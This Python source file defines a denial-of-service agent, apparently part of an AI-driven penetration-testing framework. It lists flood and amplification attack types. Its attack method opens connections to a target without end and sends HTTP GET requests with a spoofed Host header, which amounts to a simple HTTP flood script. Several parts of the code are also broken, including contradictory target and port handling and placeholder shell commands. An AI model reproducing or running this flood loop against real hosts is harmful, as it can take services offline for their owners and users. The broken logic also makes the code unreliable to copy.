import subprocess
import json
import socket
import threading
from ..orchestrator.memory import PenTestState


class DosAgent:
    def __init__(self, model, tools):
        self.model = model
        self.tools = tools
    
    #displays all dos_attack_types
    def dos_attack_type(self):
        attack_types = [
            
            "UDP Flood",
            "ICMP Flood",
            "TCP SYN Flood",
            "TCP Reset Attack",
            "IP Fragmentation Flood",
            "HTTP Flood",
            "DNS Flood",
            "NTP Amplificaiton",
            "Smurf Attack",
            "SNMP Reflection",
            "Mail bomb attack",
            "DNS Amplificaiton",
            "Ping of Death",
            "Slowloris"
        ]
        
        return ",".join(attack_types)

    async def _dos_commands(self,state: PenTestState):
        dos_commands = ['ls', 'do']
        
        for command in dos_commands:
            output = subprocess.run(command)
        
        
        state.open_ports += output
        
        return {
            
            "output": output
        }
    
    
    
    def _attack(self,state: PenTestState):
        target = state.ip_port
        port = state.ip_port[0]
        Td = state.ip_port[1]
        fake_ip = '44.197.175.168'
        
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        
        
        